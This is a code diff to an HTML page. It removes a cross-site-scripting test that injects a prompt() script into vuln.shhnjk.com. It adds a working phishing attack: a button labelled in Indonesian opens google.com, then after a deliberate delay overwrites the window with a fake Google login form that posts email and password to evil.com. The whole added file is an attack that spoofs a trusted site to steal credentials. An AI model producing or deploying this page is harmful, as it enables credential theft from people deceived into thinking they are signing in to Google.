@@ -1,2 +1,35 @@
-<head><script>name="top"</script></head>
-<iframe name="frame0" id="frame0" src="//vuln.shhnjk.com/xssable.php?xss=<iframe></iframe> <script> window[0].prompt('No domain shown'); </script>"></iframe><embed name="frame1" id="frame1" src="//vuln.shhnjk.com/xssable.php?xss=<iframe></iframe> <script> window[0].prompt('No domain shown'); </script>"><object name="frame2" id="frame2" data="//vuln.shhnjk.com/xssable.php?xss=<iframe></iframe> <script> window[0].prompt('No domain shown'); </script>"></object>
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="spoof()">Jalankan Spoof</button>
+
+    <script>
+      function spoof() {
+        const w = window.open("https://www.google.com", "_blank");
+
+        setTimeout(() => {
+          try {
+            w.stop();
+            w.document.open();
+            w.document.write(`
+              <html>
+              <head><title>Google</title></head>
+              <body>
+                <h2>Login ke Google</h2>
+                <form method="POST" action="https://evil.com">
+                  <input name="email"><br>
+                  <input name="password" type="password"><br>
+                  <input type="submit" value="Masuk">
+                </form>
+              </body>
+              </html>
+            `);
+            w.document.close();
+          } catch (e) {
+            console.error("Gagal:", e);
+          }
+        }, 1500); // delay penting agar URL asli tampil dulu
+      }
+    </script>
+  </body>
+</html>
